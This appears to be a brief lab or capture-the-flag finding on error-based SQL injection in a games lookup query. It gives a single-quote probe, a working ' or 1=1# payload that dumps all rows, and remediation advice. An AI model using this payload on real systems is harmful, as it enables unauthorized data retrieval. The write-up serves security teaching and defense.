# Error-Based SQL Injection

## Observed behaviour
Single-quote probe produced an error that revealed the query:
Query:
```sql
SELECT game FROM games WHERE game='''
```

---

## Proof-of-concept
Using this payload I returned all rows:
```sql
' or 1=1#
```

---

## Impact
Informational error leaks + injection allow full data retrieval.

---

## Quick remediation

1. Use parameterized queries / prepared statements.
2. Suppress detailed DB errors from client responses; log server-side.
3. Validate/whitelist inputs and apply least-privilege DB accounts.


